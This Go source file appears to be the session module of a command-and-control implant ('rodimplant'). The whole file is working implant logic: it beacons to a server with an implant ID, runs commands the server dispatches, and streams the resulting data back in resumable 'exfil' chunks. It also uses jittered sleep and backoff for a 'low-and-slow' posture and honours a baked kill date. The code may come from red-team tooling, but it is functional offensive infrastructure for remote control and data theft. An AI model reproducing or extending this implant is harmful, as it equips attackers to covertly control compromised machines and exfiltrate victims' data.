// Package session holds the cross-contact state one implant run carries:
// the seal and its counter, the result batch awaiting delivery, and the
// resumable exfil runs (ADR-010's upload arm). The carriage borrows the
// session; the session owns nothing transport-shaped -- so held state
// survives reconnects and failed contacts.
package session

import (
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"math/rand"
	"time"

	"rodimplant/internal/envelope"
	"rodimplant/internal/wire"

	"google.golang.org/protobuf/proto"
)

// The frame-carriage slice size: the same 512 KiB budget the platform's
// chunkers honor, under the frame-layer sizing rule.
const ExfilChunkBytes = 512 * 1024

// ExfilContactBudget is the exfil byte budget one contact carries: the
// envelope's body cap is 16 MiB of wire bytes (base64-expanded when
// sealed), so the run's slices leave room for the handshake, results, and
// demands beside them. A run larger than this spans contacts -- that
// spanning is the arm's point.
const ExfilContactBudget = 8 * 1024 * 1024

// Cycles an upload run may make no progress before the session drops it:
// the task's result already crossed, so the honest end of a run the server
// never reports on is losing the artifact, not parking its bytes forever.
const exfilIdleCycles = 3

// Handler executes one verb against its opaque argument string: the
// outcome, the output line, and -- when the verb produced bulk data -- the
// artifact the result's ExfilChunk run will carry.
type Handler func(arguments string) (outcome wire.TaskOutcome, output string, artifact *Artifact)

// Artifact is the bulk data a verb produced: the named bytes that stream
// to the artifact store as offset-bearing ExfilChunk frames after the
// result.
type Artifact struct {
	Name        string
	ContentType string
	Data        []byte
}

// exfilRun is one upload run: the artifact bytes a task produced, held on
// the session until the server's seam report says the run landed. Only a
// report moves the confirmed seam -- optimistic sends never do, so a
// contact that dies mid-flight re-sends from the last confirmed seam.
type exfilRun struct {
	task         string
	name         string
	contentType  string
	data         []byte
	sha          [32]byte
	confirmed    int
	lastReported int
	idleCycles   int
}

// Session is the implant's cross-carriage state.
type Session struct {
	ImplantID  string
	Advertised []string

	SleepSeconds  float64
	JitterSeconds float64
	KillDate      string

	Seal    *envelope.Key
	Verbs   map[string]Handler
	answers map[string]*wire.Frame

	counter   uint64
	outbox    []*wire.Frame
	delivered []*wire.Frame
	exfil     []*exfilRun
}

// New builds a session over the enrolled identity and the compiled
// handlers. The advertised verb list is the bake's set intersected with
// the compiled handlers: the server only dispatches what this binary can
// run.
func New(implantID string, bakedVerbs []string, sleepSeconds, jitterSeconds float64, killDate string, seal *envelope.Key, handlers map[string]Handler) *Session {
	s := &Session{
		ImplantID:     implantID,
		SleepSeconds:  sleepSeconds,
		JitterSeconds: jitterSeconds,
		KillDate:      killDate,
		Seal:          seal,
		Verbs:         handlers,
		answers:       map[string]*wire.Frame{},
	}
	for _, verb := range bakedVerbs {
		if _, ok := handlers[verb]; ok {
			s.Advertised = append(s.Advertised, verb)
		}
	}
	return s
}

// HandshakeFrame is the frame every contact opens with: identity,
// protocol version, the advertised verbs, and the fresh cadence.
func (s *Session) HandshakeFrame() *wire.Frame {
	request := &wire.HandshakeRequest{
		Version:       &wire.ProtocolVersion{Major: 1, Minor: 0},
		ImplantId:     s.ImplantID,
		SleepSeconds:  &s.SleepSeconds,
		JitterSeconds: &s.JitterSeconds,
	}
	request.Capabilities = append(request.Capabilities, s.Advertised...)
	return FrameOf(request, wire.FrameKind_FRAME_KIND_UNSPECIFIED)
}

// EncodeOutgoing renders frames as this contact's outgoing body: the
// framed bytes behind a fresh big-endian counter, sealed under the bake's
// key when it carries one. The counter burns per attempt, not per
// delivery, so a retransmission never trips the server's replay floor.
func (s *Session) EncodeOutgoing(frames []*wire.Frame) (body []byte, contentType string, err error) {
	encoded := wire.EncodeFrames(frames)
	if s.Seal == nil {
		return encoded, "application/octet-stream", nil
	}
	s.counter++
	plain := make([]byte, 8+len(encoded))
	binary.BigEndian.PutUint64(plain, s.counter)
	copy(plain[8:], encoded)
	sealed, err := envelope.SealContactBody(string(plain), envelope.ContactRequestAAD, *s.Seal)
	if err != nil {
		return nil, "", fmt.Errorf("seal: %w", err)
	}
	return sealed, "text/plain", nil
}

// DecodeIncoming opens a response body: sealed under the response's own
// purpose tag when the run seals, else the plaintext frames.
func (s *Session) DecodeIncoming(body []byte) ([]*wire.Frame, error) {
	plain := body
	if s.Seal != nil {
		opened, err := envelope.OpenContactBody(body, envelope.ContactResponseAAD, *s.Seal)
		if err != nil {
			return nil, fmt.Errorf("unseal: %w", err)
		}
		plain = opened
	}
	return wire.ParseFrames(plain)
}

// HandshakeAnswered reads the contact's first frame: OK crosses, every
// other status is permanent for this artifact (the caller terminates
// rather than retries).
func (s *Session) HandshakeAnswered(first *wire.Frame) error {
	var answer wire.HandshakeResponse
	if err := proto.Unmarshal(first.Payload, &answer); err != nil {
		return fmt.Errorf("handshake answer: %w", err)
	}
	if answer.Status != wire.HandshakeStatus_HANDSHAKE_STATUS_OK {
		return fmt.Errorf("handshake refused: status %d", answer.Status)
	}
	return nil
}

// AcceptTasking reads the response body past its handshake frame. Frames
// are discriminated on kind first, as the wire contract states: the seam
// report advances an exfil run's confirmed bytes, and kindless frames
// take the positional TaskRequest parse. A task whose result already
// crossed is a redelivery -- the cached result answers again, nothing
// re-executes.
func (s *Session) AcceptTasking(frames []*wire.Frame) {
	for _, f := range frames {
		switch f.Kind {
		case wire.FrameKind_FRAME_KIND_EXFIL_PROGRESS:
			var progress wire.ExfilProgress
			if err := proto.Unmarshal(f.Payload, &progress); err == nil {
				s.ApplyExfilProgress(progress.TaskId, progress.Name, progress.HeldBytes)
			}
		case wire.FrameKind_FRAME_KIND_UNSPECIFIED:
			var task wire.TaskRequest
			if err := proto.Unmarshal(f.Payload, &task); err == nil {
				s.Dispatch(&task)
			}
		}
	}
}

// Dispatch runs one dispatched task: the dedup half answers from the
// cache, the verb half executes against the argument string and queues
// the result (and, when the verb produced bulk, registers its exfil run).
func (s *Session) Dispatch(task *wire.TaskRequest) {
	if cached, ok := s.answers[task.TaskId]; ok {
		s.outbox = append(s.outbox, cached)
		return
	}
	handler, ok := s.Verbs[task.Verb]
	if !ok {
		s.queueResult(task.TaskId, wire.TaskOutcome_TASK_OUTCOME_FAILED,
			fmt.Sprintf("unknown verb %s", task.Verb), nil)
		return
	}
	outcome, output, artifact := handler(task.Arguments)
	s.queueResult(task.TaskId, outcome, output, artifact)
}

func (s *Session) queueResult(taskID string, outcome wire.TaskOutcome, output string, artifact *Artifact) {
	result := &wire.Frame{
		Payload: mustMarshal(&wire.TaskResult{TaskId: taskID, Outcome: outcome, Output: output}),
		Kind:    wire.FrameKind_FRAME_KIND_TASK_RESULT,
	}
	s.outbox = append(s.outbox, result)
	s.answers[taskID] = result
	if artifact != nil {
		sum := sha256.Sum256(artifact.Data)
		s.exfil = append(s.exfil, &exfilRun{
			task:        taskID,
			name:        artifact.Name,
			contentType: artifact.ContentType,
			data:        artifact.Data,
			sha:         sum,
		})
	}
}

// Batch is the queued result frames this contact carries.
func (s *Session) Batch() []*wire.Frame { return s.outbox }

// BatchCrossed marks the batch delivered: the frames move to the
// redelivery cache and leave the queue.
func (s *Session) BatchCrossed() {
	s.delivered = append(s.delivered, s.outbox...)
	s.outbox = nil
}

// ExfilFrames slices the pending runs into this contact's frames: each
// run serves from its confirmed seam within the budget, every slice at
// its absolute offset with the run's declared hash. Regenerated every
// cycle -- a contact that dies mid-flight never moved the seam, so the
// next one re-sends exactly the unconfirmed slices (placement is
// idempotent server-side, a duplicate is a no-op, not corruption).
func (s *Session) ExfilFrames(budget int) []*wire.Frame {
	var frames []*wire.Frame
	for _, run := range s.exfil {
		at := run.confirmed
		for at < len(run.data) && budget > 0 {
			take := min(ExfilChunkBytes, len(run.data)-at, budget)
			chunk := &wire.ExfilChunk{
				TaskId:        run.task,
				Name:          run.name,
				ContentType:   run.contentType,
				Sequence:      uint64(at / ExfilChunkBytes),
				Terminal:      at+take == len(run.data),
				Data:          run.data[at : at+take],
				Offset:        u64(uint64(at)),
				PayloadSha256: run.sha[:],
			}
			frames = append(frames, FrameOf(chunk, wire.FrameKind_FRAME_KIND_EXFIL_CHUNK))
			at += take
			budget -= take
		}
	}
	return frames
}

// ApplyExfilProgress moves a run's confirmed seam to the byte count the
// server's report names -- ahead or back (an evicted or restarted server
// rewinds the sender to re-serve from it) -- and retires a run whose
// report covers it whole.
func (s *Session) ApplyExfilProgress(task, name string, held uint64) {
	kept := s.exfil[:0]
	for _, run := range s.exfil {
		if run.task == task && run.name == name {
			run.confirmed = int(held)
			if run.confirmed >= len(run.data) {
				continue // the report at the run's end retires it
			}
		}
		kept = append(kept, run)
	}
	s.exfil = kept
}

// ExfilCycleEnd runs at every contact boundary: a run whose seam a report
// moved keeps its patience, one that heard nothing counts an idle cycle,
// and one idle past the bound is dropped.
func (s *Session) ExfilCycleEnd() {
	kept := s.exfil[:0]
	for _, run := range s.exfil {
		switch {
		case run.confirmed != run.lastReported:
			run.lastReported = run.confirmed
			run.idleCycles = 0
			kept = append(kept, run)
		case run.idleCycles+1 >= exfilIdleCycles:
			// dropped: the run's result already crossed
		default:
			run.idleCycles++
			kept = append(kept, run)
		}
	}
	s.exfil = kept
}

// ExfilPending reports whether any upload run is still owed.
func (s *Session) ExfilPending() bool { return len(s.exfil) > 0 }

// Sleep runs the jittered inter-cycle pause.
func (s *Session) Sleep() {
	base := max(s.SleepSeconds, 0.1)
	time.Sleep(time.Duration((base + jitter(s.JitterSeconds)) * float64(time.Second)))
}

// BackoffSleep widens the inter-cycle pause by consecutive failures --
// the exponential reconnect backoff the low-and-slow posture calls for.
func (s *Session) BackoffSleep(failures uint32) {
	widened := min(max(s.SleepSeconds, 1)*float64(uint32(1)<<min(failures, 5)), 600)
	time.Sleep(time.Duration(max(widened+jitter(s.JitterSeconds), 0.1) * float64(time.Second)))
}

// KillDatePassed reports whether the baked fuse has blown.
func (s *Session) KillDatePassed() bool {
	if s.KillDate == "" {
		return false
	}
	kill, err := time.Parse(time.RFC3339, s.KillDate)
	if err != nil {
		return false
	}
	return time.Now().After(kill)
}

// jitter draws one half-width around zero; a zero width is exact.
func jitter(width float64) float64 {
	if width <= 0 {
		return 0
	}
	return (rand.Float64()*2 - 1) * width
}

// FrameOf wraps a protobuf message as an upstream Frame.
func FrameOf(message proto.Message, kind wire.FrameKind) *wire.Frame {
	return &wire.Frame{Payload: mustMarshal(message), Kind: kind}
}

func mustMarshal(message proto.Message) []byte {
	payload, err := proto.Marshal(message)
	if err != nil {
		// The generated messages marshal without error; a failure here is
		// a programming fault, and dropping the frame silently is safer
		// than taking the run down.
		return nil
	}
	return payload
}

func u64(v uint64) *uint64 { return &v }
